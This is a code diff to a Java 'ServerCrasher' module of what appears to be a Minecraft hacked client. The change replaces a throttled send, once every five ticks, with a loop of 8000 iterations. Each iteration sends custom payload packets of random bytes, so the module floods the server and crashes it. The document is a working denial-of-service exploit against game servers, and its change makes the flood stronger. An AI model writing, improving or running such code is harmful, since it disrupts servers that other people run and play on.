@@ -32,6 +32,8 @@ public final class ServerCrasher extends Hack {
 		packetBuffer = new PacketBuffer(Unpooled.buffer());
 		byte[] rawPayload = new byte[(int) Math.round(Math.random() * 128)];
 		packetBuffer.writeBytes(rawPayload);
+
+		setEnabled(false);
 	}
 
 	@Override
@@ -41,7 +43,7 @@ public final class ServerCrasher extends Hack {
 
 	@SubscribeEvent
 	public void onUpdate(WUpdateEvent event) {
-		if (mc.player.ticksExisted % 5 == 0) {
+		for (int i = 0; i < 8000; i ++) {
 			for (String string : strings) {
 				mc.player.connection.sendPacket(new CPacketCustomPayload(string, packetBuffer));
 			}
